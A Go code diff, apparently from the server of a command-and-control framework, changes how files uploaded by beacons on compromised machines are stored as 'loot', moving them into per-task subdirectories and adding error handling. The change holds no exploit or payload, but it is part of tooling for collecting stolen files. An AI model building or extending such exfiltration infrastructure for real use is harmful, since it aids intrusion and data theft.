@@ -28,9 +28,18 @@ func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutp
 
 	var outputMessage string
 	if task.Command == "upload" {
-		originalPath := filepath.Base(task.Arguments)
-		lootFileName := fmt.Sprintf("%s_%s", task.TaskID, originalPath)
-		lootFilePath := filepath.Join(s.Config.LootDir, lootFileName)
+		lootFileName := filepath.Base(task.Arguments)
+		// 将文件保存到以 task_id 命名的子目录中，避免文件名冲突
+		lootTaskDir := filepath.Join(s.Config.LootDir, task.TaskID)
+		if err := os.MkdirAll(lootTaskDir, 0755); err != nil {
+			logger.Errorf("Error creating loot directory for task %s: %v", task.TaskID, err)
+			outputMessage = fmt.Sprintf("Failed to create loot directory: %v", err)
+			task.Status = "failed"
+			task.Output = outputMessage
+			s.Store.UpdateTask(task)
+			return &bridge.PushBeaconOutputResponse{}, nil
+		}
+		lootFilePath := filepath.Join(lootTaskDir, lootFileName)
 
 		if err := os.WriteFile(lootFilePath, in.Output, 0644); err != nil {
 			logger.Errorf("Error saving uploaded file for task %s: %v", task.TaskID, err)
@@ -67,7 +76,8 @@ func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutp
 			return &bridge.PushBeaconOutputResponse{}, nil
 		} else {
 			logger.Infof("Saved uploaded file to %s", lootFilePath)
-			outputMessage = lootFileName
+			// 返回相对路径 task_id/filename 供下载使用
+			outputMessage = filepath.Join(task.TaskID, lootFileName)
 
 			// Broadcast FILE_UPLOAD_COMPLETED event
 			fileEvent := struct {
@@ -78,7 +88,7 @@ func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutp
 				Payload: map[string]interface{}{
 					"task_id":       task.TaskID,
 					"beacon_id":     task.BeaconID,
-					"filename":      lootFileName,
+					"filename":      outputMessage, // 使用相对路径
 					"original_path": task.Arguments,
 				},
 			}
